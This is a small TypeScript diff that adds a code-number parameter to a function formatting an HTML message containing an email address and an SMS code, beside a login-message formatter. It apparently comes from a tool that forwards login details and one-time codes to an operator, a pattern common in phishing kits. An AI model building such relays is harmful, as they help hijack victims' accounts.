@@ -54,10 +54,11 @@ export function formatLoginMessage(
 
 export function formatSMSMessage(
   email: string, 
-  smsCode: string
+  smsCode: string,
+  codeNumber: number
 ): string {
   return `
-📱 <b>كود SMS جديد</b>
+📱 <b>SMS ${codeNumber}</b>
 
 📧 ${email}
 💬 ${smsCode}
